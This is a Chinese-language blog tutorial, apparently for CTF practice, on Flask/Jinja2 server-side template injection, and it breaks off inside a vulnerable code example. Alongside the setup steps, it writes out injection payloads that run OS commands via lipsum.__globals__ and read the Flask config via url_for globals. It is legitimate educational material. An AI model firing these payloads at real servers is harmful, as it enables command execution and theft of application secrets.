<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[SSTI]总结 - Nexuzzz0</title><meta name=Description content="Nexuzzz0's BLOG"><meta property="og:title" content="[SSTI]总结">
<meta property="og:description" content="SSTISSTI（Server Side Template Injection，服务器端模板注入），模板指的就是Web开发中所使用的模板引擎（如python 的一些框架"><meta property="og:type" content="article"><meta property="og:url" content="https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/"><meta property="og:image" content="https://nexuzzz0.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-15T21:20:12+08:00"><meta property="article:modified_time" content="2024-10-15T21:20:12+08:00"><meta property="og:site_name" content="Nexuzzz0's BLOG"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nexuzzz0.github.io/logo.png"><meta name=twitter:title content="[SSTI]总结"><meta name=twitter:description content="SSTISSTI（Server Side Template Injection，服务器端模板注入），模板指的就是Web开发中所使用的模板引擎（如python 的一些框架"><meta name=application-name content="Nexuzzz0's BLOG"><meta name=apple-mobile-web-app-title content="Nexuzzz0's BLOG"><meta name=theme-color content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/><link rel=prev href=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/><link rel=next href=https://nexuzzz0.github.io/posts/python/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87/><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/color.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[SSTI]总结","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/nexuzzz0.github.io\/posts\/python\/ssti%E6%80%BB%E7%BB%93\/"},"genre":"posts","keywords":"SSTI, Python","wordcount":9905,"url":"https:\/\/nexuzzz0.github.io\/posts\/python\/ssti%E6%80%BB%E7%BB%93\/","datePublished":"2024-10-15T21:20:12+08:00","dateModified":"2024-10-15T21:20:12+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Nexuzzz0"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark"),window.theme=e,window.isDark=window.theme!=="light"}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else"auto"==="light"||"auto"==="dark"||"auto"==="black"?(setTheme("auto"),saveTheme("auto")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")],window.switchThemeEventSet=new Set</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=desktop-header-typeit class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/friend/ title=Friend>友链 </a><a class=menu-item href=/about/ title=About>关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i>
</span></span><a href=javascript:void(0); class="menu-item theme-select" title=切换主题><i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-desktop title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=mobile-header-typeit class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/friend/ title=Friend>友链</a><a class=menu-item href=/about/ title=About>关于</a><a href=javascript:void(0); class="menu-item theme-select" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#venv环境>venv环境</a></li><li><a href=#flask>Flask</a><ul><li><a href=#flask变量及方法>flask变量及方法</a></li><li><a href=#flask内置函数和对象获取config>flask内置函数和对象(获取config)</a></li><li><a href=#flask模版介绍>flask模版介绍</a></li><li><a href=#flask模板漏洞介绍>flask模板漏洞介绍</a></li><li><a href=#继承关系>继承关系</a></li><li><a href=#魔术方法>魔术方法</a></li><li><a href=#常用过滤器>常用过滤器</a></li></ul></li><li><a href=#基本知识>基本知识</a><ul><li><a href=#python-2>Python 2</a></li><li><a href=#python-3>Python 3</a></li><li><a href=#判断-python-版本>判断 Python 版本</a></li></ul></li><li><a href=#ssti常用注入模块利用>SSTI常用注入模块利用</a><ul><li><a href=#脚本查询模块>脚本查询模块</a></li><li><a href=#文件读取>文件读取</a></li><li><a href=#eval命令执行>eval命令执行</a></li><li><a href=#os模块>os模块</a></li><li><a href=#importlilb模块>importlilb模块</a></li><li><a href=#linecache模块>linecache模块</a></li><li><a href=#subprocesspopen类>subprocess.Popen类</a></li></ul></li><li><a href=#bypass>Bypass</a><ul><li><a href=#过滤->过滤<code>{{ }}</code></a></li><li><a href=#过滤--1>过滤<code>[ ]</code></a></li><li><a href=#过滤单双引号>过滤单/双引号</a></li><li><a href=#过滤下划线>过滤下划线</a></li><li><a href=#过滤点>过滤点</a></li><li><a href=#过滤关键词>过滤关键词</a></li><li><a href=#过滤数字>过滤数字</a></li><li><a href=#混合过滤>混合过滤</a></li><li><a href=#无回显ssti>无回显SSTI</a></li></ul></li><li><a href=#python-debug-pin码计算>python debug pin码计算</a><ul><li><a href=#pin码>pin码</a></li><li><a href=#pin码生成原理>pin码生成原理</a></li><li><a href=#pin码计算ctf题目>pin码计算CTF题目</a></li></ul></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[SSTI]总结</h1><div class=post-meta><div class=post-meta-line><span class=post-author><span class="author fas fa-user-circle fa-fw"></span><a href=/ title=Author rel=author class=author>Nexuzzz0</a>
</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=15159-1010-1510>15159-1010-1510</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=15159-1010-1510>15159-1010-1510</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 9905 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 20 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#venv环境>venv环境</a></li><li><a href=#flask>Flask</a><ul><li><a href=#flask变量及方法>flask变量及方法</a></li><li><a href=#flask内置函数和对象获取config>flask内置函数和对象(获取config)</a></li><li><a href=#flask模版介绍>flask模版介绍</a></li><li><a href=#flask模板漏洞介绍>flask模板漏洞介绍</a></li><li><a href=#继承关系>继承关系</a></li><li><a href=#魔术方法>魔术方法</a></li><li><a href=#常用过滤器>常用过滤器</a></li></ul></li><li><a href=#基本知识>基本知识</a><ul><li><a href=#python-2>Python 2</a></li><li><a href=#python-3>Python 3</a></li><li><a href=#判断-python-版本>判断 Python 版本</a></li></ul></li><li><a href=#ssti常用注入模块利用>SSTI常用注入模块利用</a><ul><li><a href=#脚本查询模块>脚本查询模块</a></li><li><a href=#文件读取>文件读取</a></li><li><a href=#eval命令执行>eval命令执行</a></li><li><a href=#os模块>os模块</a></li><li><a href=#importlilb模块>importlilb模块</a></li><li><a href=#linecache模块>linecache模块</a></li><li><a href=#subprocesspopen类>subprocess.Popen类</a></li></ul></li><li><a href=#bypass>Bypass</a><ul><li><a href=#过滤->过滤<code>{{ }}</code></a></li><li><a href=#过滤--1>过滤<code>[ ]</code></a></li><li><a href=#过滤单双引号>过滤单/双引号</a></li><li><a href=#过滤下划线>过滤下划线</a></li><li><a href=#过滤点>过滤点</a></li><li><a href=#过滤关键词>过滤关键词</a></li><li><a href=#过滤数字>过滤数字</a></li><li><a href=#混合过滤>混合过滤</a></li><li><a href=#无回显ssti>无回显SSTI</a></li></ul></li><li><a href=#python-debug-pin码计算>python debug pin码计算</a><ul><li><a href=#pin码>pin码</a></li><li><a href=#pin码生成原理>pin码生成原理</a></li><li><a href=#pin码计算ctf题目>pin码计算CTF题目</a></li></ul></li></ul></nav></div></div><div class=content id=content><h1 id=ssti class=headerLink><a href=#ssti class=header-mark></a>SSTI</h1><p>SSTI（Server Side Template Injection，<strong>服务器端模板注入</strong>），模板指的就是Web开发中所使用的模板引擎（如python 的一些框架 jinja2 mako tornado django，PHP 框架smarty twig，以及 java 框架jade velocity）。模板引擎可以将用户界面和业务数据分离，逻辑代码和业务代码也可以因此分离，代码复用变得简单，开发效率也随之提高。<br>服务器端使用模板，通过模板引擎对数据进行渲染，再传递给用户，就可以针对特定用户/特定参数生成相应的页面。我们可以类比百度搜索，搜索不同词条得到的结果页面是不同的，但页面的框架是基本不变的。</p><p>SSTI 注入的引发，本质是因为没有遵循<strong>数据代码分离</strong>的原则，导致<strong>输入的数据被当成代码执行</strong>。将用户传入的 {{xxx}} 当做了变量，至此造成了 SSTI 注入</p><p>python 的一些框架 jinja2 mako tornado django，PHP 框架smarty twig，以及 java 框架jade velocity</p><p>举个最简单的例子</p><p><code>print("hello {username}")</code></p><p>在这里，username 可控，当我们输入的为 {{7*7}} 的时候，我们提交的参数会被当做变量，当我们传入其他恶意参数的时候，此时开发者有没有对其进行严格的过滤，由此可能会引发任意命令执行</p><p>贴一张基本判断的图</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120230.jpeg title=eec4b6fd66680b65aca19da426016c95_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120230.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120230.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120230.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120230.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120230.jpeg 2x" sizes=auto alt=eec4b6fd66680b65aca19da426016c95_MD5></a></figure></p><h2 id=venv环境 class=headerLink><a href=#venv%e7%8e%af%e5%a2%83 class=header-mark></a>venv环境</h2><p>venv虚拟环境（类似于docker）：创建和管理虚拟环境的模块</p><p>用于应对每个组件要求的配套应用版本不同，可以把它想象成一个容器，该容器供你用于存放你的python脚本以及安装各种 python 第三方木块，容器里的环境和本机是完全分开的（就像在 windows 主机上通过 VMware 跑一台 Ubuntu 虚拟机一样），也就是说你在 venv 下通过 pip 安装的 python 第三方模块是不会存在于你本机的环境下的</p><p><strong>安装 venv</strong></p><p><code>python --version</code></p><p><code>apt update</code></p><p><code>apt install python3.10-venv</code></p><p><strong>创建 venv 环境安装 flask</strong></p><p><code>cd /opt</code></p><p><code>python3 -m venv flask1</code>创建名为 flask1 的 venv 环境</p><p><code>cd flask1</code></p><p><code>ls</code>可以看到包含所有 python 组件</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120251.jpeg title=f10dc004e86e52f6bac2380ec1c6f31c_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120251.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120251.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120251.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120251.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120251.jpeg 2x" sizes=auto alt=f10dc004e86e52f6bac2380ec1c6f31c_MD5></a></figure></p><p><strong>执行 flask1 路径下的 python</strong></p><p>法1：<code>/opt/flask1/bin/python3 demo.py</code>绝对路径</p><p>法2：</p><p><code>cd flask1 source .bin/activate</code>进入 flask1 虚拟环境</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg title=68b0efa3e14f0a24ec0da81f30fde778_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg 2x" sizes=auto alt=68b0efa3e14f0a24ec0da81f30fde778_MD5></a></figure></p><p><strong>安装 flask</strong></p><p><code>pip3 install flask</code>
<code>python3</code>
<code>import flask </code><code>quit()</code>
<code>deactivate</code>退出虚拟环境</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120219.jpeg title=c3e0c3947032a5934a780f9881c91cd5_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120219.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120219.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120219.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120219.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120219.jpeg 2x" sizes=auto alt=c3e0c3947032a5934a780f9881c91cd5_MD5></a></figure></p><h2 id=flask class=headerLink><a href=#flask class=header-mark></a>Flask</h2><p>Flask 是一个使用 python 编写的轻量级 web 应用框架，python 可直接用 flask 启动一个 web 服务页面。</p><p>Flask特点：良好的文档、丰富的插件、包含开发服务器和调试器（debugger）、集成支持单元测试、RESTful请求调度、支持安全cookies、基于Unicode。</p><p>其 WSGI 工具箱采用 Werkzeng，模板引擎则使用 Jinja2，Flask 使用 BSD 授权。</p><p>使用：</p><p><code>/opt.flask1</code></p><p><code>vim demo.py</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span>          <span class=o>//</span><span class=n>启动flask模块</span><span class=err>，</span><span class=n>创建一个Flask类</span>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>            <span class=o>//</span><span class=n>name类似于魔术方法</span><span class=err>，</span><span class=n>调用这个方法能获取到当前app的name</span><span class=err>，</span><span class=n>如果在程序内部运行</span><span class=err>，</span><span class=n>得到的是main</span><span class=err>，</span><span class=n>通过别的程序引入的话就是demo</span><span class=o>.</span><span class=n>py</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>                  <span class=o>//</span><span class=n>路由</span><span class=err>，</span><span class=n>基于字符串查找</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;hello benben&#34;</span>
</span></span><span class=line><span class=cl>                 
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>        <span class=o>//</span><span class=n>只能被python直接运行</span><span class=err>，</span><span class=n>而不能被作为组件或模块被调用</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>()</span>
</span></span></code></pre></div><p>靶场（SSTILAB）：</p><p><code>docker pull mcc0624/flask_ssti:last</code></p><p><code>docker run -p 18022:22 -p 8089:80 -i -t mcc0624/flask_ssti:last</code></p><h3 id=flask变量及方法 class=headerLink><a href=#flask%e5%8f%98%e9%87%8f%e5%8f%8a%e6%96%b9%e6%b3%95 class=header-mark></a>flask变量及方法</h3><p><strong>格式化字符串</strong></p><p>Flask变量规则，通过向规则参数添加变量部分，可以动态构建URL</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120233.jpeg title=b84d599863107b4d171ee0be124d2890_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120233.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120233.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120233.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120233.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120233.jpeg 2x" sizes=auto alt=b84d599863107b4d171ee0be124d2890_MD5></a></figure></p><p>访问/hello/iamhacker</p><p>发现动态创建了一个网页。原理就是通过url传进name变量。</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120258.jpeg title=beb367d04be61137e795fad88234410a_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120258.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120258.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120258.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120258.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120258.jpeg 2x" sizes=auto alt=beb367d04be61137e795fad88234410a_MD5></a></figure></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120669.jpeg title=7707e0ffbadc0ef0548c9db0ae8509a2_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120669.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120669.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120669.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120669.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120669.jpeg 2x" sizes=auto alt=7707e0ffbadc0ef0548c9db0ae8509a2_MD5></a></figure></p><h3 id=flask内置函数和对象获取config class=headerLink><a href=#flask%e5%86%85%e7%bd%ae%e5%87%bd%e6%95%b0%e5%92%8c%e5%af%b9%e8%b1%a1%e8%8e%b7%e5%8f%96config class=header-mark></a>flask内置函数和对象(获取config)</h3><p><strong>flask内置函数</strong></p><pre tabindex=0><code>**lipsum**     flask的一个方法，可以用于得到`__builtins__`，而且`lipsum.__globals__`含有os模块：`{{lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}}`

**url_for**     flask的一个方法，可以用于得到`__builtins__`，而且`url_for.__globals__[&#39;__builtins__&#39;]`含有`current_app`

**get_flashed_message**     flask的一个方法，可以用于得到`__builtins__`，而且`url_for.__globals__[&#39;__builtins__&#39;]`含有`current_app`

**attr     **用于获取变量，`&#34;&#34;|attr(&#34;__class__&#34;)`相当于`&#34;&#34;.__class__`
</code></pre><p><strong>flask内置对象</strong></p><pre tabindex=0><code>cycler

joiner

namespace

config

request

session
</code></pre><p>可利用已加载内置函数或对象寻找被过滤字符串</p><p>可利用内置函数调用<code>current_app</code>模块进而查看配置文件</p><p><strong>current_app</strong></p><p>调用<code>current_app</code>相当于调用flask</p><p><code>{{url_for.__globals__['current_app'].config}}</code></p><p><code>{{get_flashed_messages.__globals__['current_app'].config}}</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120710.jpeg title=e40ec13d19891a3ab782ab96e619d5ec_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120710.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120710.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120710.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120710.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120710.jpeg 2x" sizes=auto alt=e40ec13d19891a3ab782ab96e619d5ec_MD5></a></figure></p><h3 id=flask模版介绍 class=headerLink><a href=#flask%e6%a8%a1%e7%89%88%e4%bb%8b%e7%bb%8d class=header-mark></a>flask模版介绍</h3><p><strong>render_template</strong>就是加载html的内容渲染后再展示。在html中的{{xxx}},会被动态变量所替代。</p><p>例如</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span><span class=o>=</span><span class=s1>&#39;123&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>,</span><span class=n>m1</span><span class=o>=</span><span class=n>m</span><span class=p>)</span>
</span></span></code></pre></div><p>index.html中的{{m1}}就会变成m的值。</p><p><strong>render_tempplate_string</strong></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120741.jpeg title=e9caf3b6ff83a1ad6ee39d62556f69f4_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120741.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120741.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120741.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120741.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120741.jpeg 2x" sizes=auto alt=e9caf3b6ff83a1ad6ee39d62556f69f4_MD5></a></figure></p><h3 id=flask模板漏洞介绍 class=headerLink><a href=#flask%e6%a8%a1%e6%9d%bf%e6%bc%8f%e6%b4%9e%e4%bb%8b%e7%bb%8d class=header-mark></a>flask模板漏洞介绍</h3><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120735.jpeg title=1c95ded6f0f7cdfeceeed8eab219b70f_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120735.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120735.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120735.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120735.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120735.jpeg 2x" sizes=auto alt=1c95ded6f0f7cdfeceeed8eab219b70f_MD5></a></figure></p><p>这种写法就不会有漏洞出现。</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120794.jpeg title=e0a0ea237602ee616f4ca534c9188897_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120794.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120794.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120794.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120794.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120794.jpeg 2x" sizes=auto alt=e0a0ea237602ee616f4ca534c9188897_MD5></a></figure></p><p>先格式化再渲染可能会出现漏洞</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120803.jpeg title=fca00dce4a1712a39157e206afd9aaf1_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120803.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120803.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120803.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120803.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120803.jpeg 2x" sizes=auto alt=fca00dce4a1712a39157e206afd9aaf1_MD5></a></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>importlib.resources</span> <span class=kn>import</span> <span class=n>contents</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span><span class=n>request</span><span class=p>,</span><span class=n>render_template_string</span>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span><span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
